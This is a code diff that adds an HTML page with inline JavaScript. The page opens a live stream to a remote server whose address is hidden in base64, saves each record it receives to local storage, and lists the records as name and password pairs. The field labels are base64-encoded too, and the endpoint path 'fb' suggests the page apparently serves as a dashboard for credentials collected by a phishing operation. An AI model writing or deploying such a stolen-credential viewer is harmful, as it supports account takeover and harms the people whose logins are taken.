@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="Storage.js"></script>
+    <title>Document</title>
+    <style>
+        body>.empty,
+        body>.pending {
+            display: none;
+        }
+
+        body.empty>.empty,
+        body.pending>.pending {
+            display: block;
+        }
+
+        ul {
+            list-style: decimal;
+            list-style-position: outside;
+        }
+
+        li {
+            border: 1px solid;
+            padding: 12px;
+            width: fit-content;
+            margin-bottom: 7px;
+        }
+        mark{
+            padding: 5px;
+        }
+    </style>
+</head>
+
+<body class="pending">
+    <p class="empty">No data yet</p>
+    <p class="pending">Data is loading...</p>
+    <ul id="ul">
+
+    </ul>
+    <script>
+        //'data'
+        const db = new Storage("local-store", "item", true);
+        let size = 0;
+        function set(data) {
+            if (document.body.className) document.body.className = "";
+            const li = document.createElement("li")
+            li.innerHTML = `
+                ${atob("bmFtZQ==")}: <input value="${atob(data[1])}">
+                <br>
+                <br>
+                ${atob("cGFzc3dvcmQ=")}: <input value="${atob(data[2])}">
+            `
+            ul.appendChild(li)
+        };
+        (async function () {
+            size = await db.length();
+            if (size < 1) {
+                document.body.className = "empty"
+            } else {
+                document.body.className = ""
+            }
+            await db.getAllItem(set);
+            const stream = new EventSource(`${atob("aHR0cHM6Ly9hcGktaHl4cS5vbnJlbmRlci5jb20v")}fb?start=${size}`)
+            stream.onmessage = async function ({ data }) {
+                console.log(data);
+                if (data === "close") return stream.close()
+                data = JSON.parse(data);
+                await db.setItem(data);
+                set(data);
+            }
+            stream.onerror = (e) => {
+                alert("an error has occured. please report to author")
+                stream.close()
+                console.log(e);
+            }
+        })()
+    </script>
+</body>
+
+</html>
